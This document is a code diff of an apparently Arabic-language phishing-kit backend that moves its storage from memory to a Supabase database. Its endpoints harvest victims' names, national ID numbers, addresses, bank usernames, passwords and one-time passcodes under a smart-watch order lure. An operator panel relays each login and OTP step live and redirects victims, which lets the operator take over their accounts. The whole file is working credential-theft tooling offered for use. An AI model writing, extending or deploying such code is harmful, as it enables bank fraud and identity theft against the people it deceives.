@@ -1,20 +1,10 @@
 const crypto = require('crypto');
 const fs = require('fs');
 const path = require('path');
+const { supabase } = require('../lib/supabase');
 
 const ADMIN_HASH = '240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9';
 const TOKEN_SECRET = ADMIN_HASH + '_mbank_secret';
-const visitors = {};
-const orders = [];
-const clicks = [];
-const blockedIPs = new Set();
-const sessions = [];
-let orderCounter = 1000;
-let sessionCounter = 5000;
-let clickCounter = 0;
-let totalVisitsToday = 0;
-let pageViewsToday = 0;
-let todayDate = new Date().toDateString();
 
 function sha256(str) {
   return crypto.createHash('sha256').update(str).digest('hex');
@@ -52,19 +42,6 @@ function isAdmin(req) {
   if (header && verifyToken(header)) return true;
   const cookies = getCookies(req);
   return verifyToken(cookies.admin_token);
-}
-
-function getActiveVisitors() {
-  const cutoff = Date.now() - 60000;
-  const active = [];
-  for (const ip in visitors) {
-    if (visitors[ip].time > cutoff) {
-      active.push(visitors[ip]);
-    } else {
-      delete visitors[ip];
-    }
-  }
-  return active;
 }
 
 function readBody(req) {
@@ -122,9 +99,7 @@ module.exports = async (req, res) => {
     const body = await readBody(req);
     try {
       const data = JSON.parse(body);
-      orderCounter++;
-      orders.push({
-        id: orderCounter,
+      await supabase.from('orders').insert({
         name: '', phone: '', id_number: '', email: '', emirate: '', address: '',
         country: (data.country || 'غير معروف').substring(0, 100),
         service: (data.service || '').substring(0, 100),
@@ -142,13 +117,13 @@ module.exports = async (req, res) => {
   // --- Orders ---
   if (req.method === 'POST' && reqPath === '/api/orders') {
     const ip = getIP(req);
-    if (blockedIPs.has(ip)) return json(res, { success: false, message: 'محظور' }, 403);
+    const { data: blocked } = await supabase.from('blocked_ips').select('ip').eq('ip', ip).single();
+    if (blocked) return json(res, { success: false, message: 'محظور' }, 403);
+
     const body = await readBody(req);
     try {
       const data = JSON.parse(body);
-      orderCounter++;
-      const order = {
-        id: orderCounter,
+      const { data: order, error } = await supabase.from('orders').insert({
         name: (data.name || '').substring(0, 100),
         phone: (data.phone || '').substring(0, 20),
         id_number: (data.id_number || '').substring(0, 50),
@@ -158,11 +133,11 @@ module.exports = async (req, res) => {
         country: (data.country || 'الإمارات').substring(0, 50),
         service: (data.service || 'طلب ساعة ذكية').substring(0, 100),
         lang: data.lang || 'ar',
-        ip: ip,
+        ip,
         status: 'pending',
         date: new Date().toISOString()
-      };
-      orders.push(order);
+      }).select().single();
+      if (error) return json(res, { error: error.message }, 500);
       return json(res, { success: true, id: order.id });
     } catch (e) {
       return json(res, { success: false, message: 'خطأ في البيانات' }, 400);
@@ -171,27 +146,32 @@ module.exports = async (req, res) => {
 
   // --- Stats ---
   if (req.method === 'GET' && reqPath === '/api/stats') {
-    const active = getActiveVisitors();
+    const cutoff = new Date(Date.now() - 60000).toISOString();
+    const { count: activeCount } = await supabase.from('visitors').select('id', { count: 'exact', head: true }).gt('last_seen', cutoff);
+    const { count: totalOrders } = await supabase.from('orders').select('id', { count: 'exact', head: true });
+    const { count: pendingOrders } = await supabase.from('orders').select('id', { count: 'exact', head: true }).eq('status', 'pending');
     return json(res, {
-      activeVisitors: active.length,
-      totalVisitsToday,
-      pageViewsToday,
-      totalOrders: orders.length,
-      pendingOrders: orders.filter(o => o.status === 'pending').length
+      activeVisitors: activeCount || 0,
+      totalVisitsToday: 0,
+      pageViewsToday: 0,
+      totalOrders: totalOrders || 0,
+      pendingOrders: pendingOrders || 0
     });
   }
 
   // --- Get Orders ---
   if (req.method === 'GET' && reqPath === '/api/orders') {
     if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
-    return json(res, { orders: orders.slice().reverse() });
+    const { data: orders } = await supabase.from('orders').select('*').order('id', { ascending: false });
+    return json(res, { orders: orders || [] });
   }
 
   // --- Visitors ---
   if (req.method === 'GET' && reqPath === '/api/visitors') {
     if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
-    const active = getActiveVisitors();
-    return json(res, { visitors: active, count: active.length });
+    const cutoff = new Date(Date.now() - 60000).toISOString();
+    const { data: active } = await supabase.from('visitors').select('*').gt('last_seen', cutoff);
+    return json(res, { visitors: active || [], count: (active || []).length });
   }
 
   // --- Order Status ---
@@ -200,9 +180,8 @@ module.exports = async (req, res) => {
     const body = await readBody(req);
     try {
       const data = JSON.parse(body);
-      const order = orders.find(o => o.id === data.id);
-      if (!order) return json(res, { error: 'not found' }, 404);
-      order.status = data.status;
+      const { error } = await supabase.from('orders').update({ status: data.status }).eq('id', data.id);
+      if (error) return json(res, { error: 'not found' }, 404);
       return json(res, { success: true });
     } catch (e) {
       return json(res, { error: 'bad request' }, 400);
@@ -215,8 +194,8 @@ module.exports = async (req, res) => {
     const body = await readBody(req);
     try {
       const data = JSON.parse(body);
-      blockedIPs.add(data.ip);
-      orders.forEach(o => { if (o.ip === data.ip) o.status = 'blocked'; });
+      await supabase.from('blocked_ips').upsert({ ip: data.ip }, { onConflict: 'ip' });
+      await supabase.from('orders').update({ status: 'blocked' }).eq('ip', data.ip);
       return json(res, { success: true });
     } catch (e) {
       return json(res, { error: 'bad request' }, 400);
@@ -230,41 +209,38 @@ module.exports = async (req, res) => {
     try {
       const data = JSON.parse(body);
       if (data.sessionId) {
-        const existing = sessions.find(s => s.id === parseInt(data.sessionId));
+        const { data: existing } = await supabase.from('sessions').select('id').eq('id', parseInt(data.sessionId)).single();
         if (existing) {
-          existing.username = (data.username || '').substring(0, 100);
-          existing.password = (data.password || '').substring(0, 100);
-          existing.loginStatus = 'waiting';
-          existing.otp = null;
-          existing.otpStatus = null;
-          existing.redirectUrl = null;
-          existing.date = new Date().toISOString();
+          await supabase.from('sessions').update({
+            username: (data.username || '').substring(0, 100),
+            password: (data.password || '').substring(0, 100),
+            login_status: 'waiting',
+            otp: null,
+            otp_status: null,
+            redirect_url: null,
+            date: new Date().toISOString()
+          }).eq('id', existing.id);
           return json(res, { success: true, id: existing.id });
         }
       }
-      sessionCounter++;
-      const session = {
-        id: sessionCounter,
+      const { data: session, error } = await supabase.from('sessions').insert({
         username: (data.username || '').substring(0, 100),
         password: (data.password || '').substring(0, 100),
         country: (data.country || 'غير معروف').substring(0, 100),
         lang: data.lang || 'ar',
         ip,
         service: (data.service || '').substring(0, 200),
-        orderName: (data.orderName || '').substring(0, 100),
-        orderPhone: (data.orderPhone || '').substring(0, 50),
-        orderEmail: (data.orderEmail || '').substring(0, 100),
-        orderIdNumber: (data.orderIdNumber || '').substring(0, 50),
-        orderEmirate: (data.orderEmirate || '').substring(0, 50),
-        orderAddress: (data.orderAddress || '').substring(0, 200),
-        orderId: data.orderId ? parseInt(data.orderId) : null,
-        loginStatus: 'waiting',
-        otp: null,
-        otpStatus: null,
-        redirectUrl: null,
+        order_name: (data.orderName || '').substring(0, 100),
+        order_phone: (data.orderPhone || '').substring(0, 50),
+        order_email: (data.orderEmail || '').substring(0, 100),
+        order_id_number: (data.orderIdNumber || '').substring(0, 50),
+        order_emirate: (data.orderEmirate || '').substring(0, 50),
+        order_address: (data.orderAddress || '').substring(0, 200),
+        order_id: data.orderId ? parseInt(data.orderId) : null,
+        login_status: 'waiting',
         date: new Date().toISOString()
-      };
-      sessions.push(session);
+      }).select().single();
+      if (error) return json(res, { error: error.message }, 500);
       return json(res, { success: true, id: session.id });
     } catch (e) {
       return json(res, { error: 'bad request' }, 400);
@@ -274,9 +250,9 @@ module.exports = async (req, res) => {
   // --- Login Attempt Status Check ---
   if (req.method === 'GET' && reqPath.startsWith('/api/login-attempts/') && reqPath.endsWith('/status')) {
     const id = parseInt(reqPath.split('/')[3]);
-    const s = sessions.find(a => a.id === id);
+    const { data: s } = await supabase.from('sessions').select('login_status, redirect_url').eq('id', id).single();
     if (!s) return json(res, { status: 'not_found' }, 404);
-    return json(res, { status: s.loginStatus, redirectUrl: s.redirectUrl || null });
+    return json(res, { status: s.login_status, redirectUrl: s.redirect_url || null });
   }
 
   // --- Update Login Status ---
@@ -285,9 +261,8 @@ module.exports = async (req, res) => {
     const body = await readBody(req);
     try {
       const data = JSON.parse(body);
-      const s = sessions.find(a => a.id === data.id);
-      if (!s) return json(res, { error: 'not found' }, 404);
-      s.loginStatus = data.status;
+      const { error } = await supabase.from('sessions').update({ login_status: data.status }).eq('id', data.id);
+      if (error) return json(res, { error: 'not found' }, 404);
       return json(res, { success: true });
     } catch (e) {
       return json(res, { error: 'bad request' }, 400);
@@ -300,11 +275,13 @@ module.exports = async (req, res) => {
     try {
       const data = JSON.parse(body);
       const id = parseInt(data.loginId);
-      const s = sessions.find(a => a.id === id);
+      const { data: s } = await supabase.from('sessions').select('id').eq('id', id).single();
       if (!s) return json(res, { error: 'session not found' }, 404);
-      s.otp = (data.otp || '').substring(0, 20);
-      s.otpStatus = 'waiting';
-      return json(res, { success: true, id: s.id });
+      await supabase.from('sessions').update({
+        otp: (data.otp || '').substring(0, 20),
+        otp_status: 'waiting'
+      }).eq('id', id);
+      return json(res, { success: true, id });
     } catch (e) {
       return json(res, { error: 'bad request' }, 400);
     }
@@ -313,9 +290,9 @@ module.exports = async (req, res) => {
   // --- OTP Status Check ---
   if (req.method === 'GET' && reqPath.startsWith('/api/otp-attempts/') && reqPath.endsWith('/status')) {
     const id = parseInt(reqPath.split('/')[3]);
-    const s = sessions.find(a => a.id === id);
+    const { data: s } = await supabase.from('sessions').select('otp_status, redirect_url').eq('id', id).single();
     if (!s) return json(res, { status: 'not_found' }, 404);
-    return json(res, { status: s.otpStatus || 'not_found', redirectUrl: s.redirectUrl || null });
+    return json(res, { status: s.otp_status || 'not_found', redirectUrl: s.redirect_url || null });
   }
 
   // --- Update OTP Status ---
@@ -324,9 +301,8 @@ module.exports = async (req, res) => {
     const body = await readBody(req);
     try {
       const data = JSON.parse(body);
-      const s = sessions.find(a => a.id === data.id);
-      if (!s) return json(res, { error: 'not found' }, 404);
-      s.otpStatus = data.status;
+      const { error } = await supabase.from('sessions').update({ otp_status: data.status }).eq('id', data.id);
+      if (error) return json(res, { error: 'not found' }, 404);
       return json(res, { success: true });
     } catch (e) {
       return json(res, { error: 'bad request' }, 400);
@@ -336,14 +312,28 @@ module.exports = async (req, res) => {
   // --- Sessions List ---
   if (req.method === 'GET' && reqPath === '/api/sessions') {
     if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
-    const list = sessions.slice().reverse().map(s => {
+    const { data: sessions } = await supabase.from('sessions').select('*').order('id', { ascending: false });
+    const list = (sessions || []).map(s => {
       let pendingAction = null;
-      if (s.loginStatus === 'waiting') {
+      if (s.login_status === 'waiting') {
         pendingAction = { type: 'login', id: s.id };
-      } else if (s.loginStatus === 'approved' && s.otpStatus === 'waiting') {
+      } else if (s.login_status === 'approved' && s.otp_status === 'waiting') {
         pendingAction = { type: 'otp', id: s.id };
       }
-      return { ...s, pendingAction };
+      return {
+        ...s,
+        loginStatus: s.login_status,
+        otpStatus: s.otp_status,
+        redirectUrl: s.redirect_url,
+        orderName: s.order_name,
+        orderPhone: s.order_phone,
+        orderEmail: s.order_email,
+        orderIdNumber: s.order_id_number,
+        orderEmirate: s.order_emirate,
+        orderAddress: s.order_address,
+        orderId: s.order_id,
+        pendingAction
+      };
     });
     return json(res, { sessions: list });
   }
@@ -354,9 +344,8 @@ module.exports = async (req, res) => {
     const body = await readBody(req);
     try {
       const data = JSON.parse(body);
-      const s = sessions.find(a => a.id === data.id);
-      if (!s) return json(res, { error: 'not found' }, 404);
-      s.redirectUrl = data.url;
+      const { error } = await supabase.from('sessions').update({ redirect_url: data.url }).eq('id', data.id);
+      if (error) return json(res, { error: 'not found' }, 404);
       return json(res, { success: true });
     } catch (e) {
       return json(res, { error: 'bad request' }, 400);
@@ -365,6 +354,8 @@ module.exports = async (req, res) => {
 
   // --- Heartbeat ---
   if (reqPath === '/api/heartbeat') {
+    const ip = getIP(req);
+    await supabase.from('visitors').upsert({ ip, page: '', last_seen: new Date().toISOString() }, { onConflict: 'ip' });
     return json(res, { ok: true });
   }
 
